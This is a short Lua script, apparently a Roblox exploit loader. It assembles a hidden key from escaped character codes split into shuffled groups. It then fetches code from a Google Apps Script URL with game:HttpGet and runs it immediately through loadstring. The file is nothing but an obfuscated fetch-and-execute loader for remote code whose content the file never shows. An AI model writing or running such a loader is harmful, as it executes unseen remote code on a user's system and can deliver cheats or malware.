local rawParts = {
    {"\105", "\89", "\114", "\49"},
    {"\80", "\53", "\112", "\55"},
    {"\51", "\53", "\65", "\116"},
    {"\99", "\80", "\53", "\51"},
    {"\115", "\72", "\51", "\66"}
}

local order = {5, 4, 2, 1, 3}

local asciiKey = ""
for _, i in ipairs(order) do
    for _, char in ipairs(rawParts[i]) do
        asciiKey = asciiKey .. char
    end
end

local url = "https://script.google.com/macros/s/AKfycbwsdvgHFBx5js89m-FkeVnuom0PIBg0YfnLhlXhukeqy1Zvqn_iN3N__kAjyh8gdQ7WCA/exec?key=" .. asciiKey

loadstring(game:HttpGet(url))()
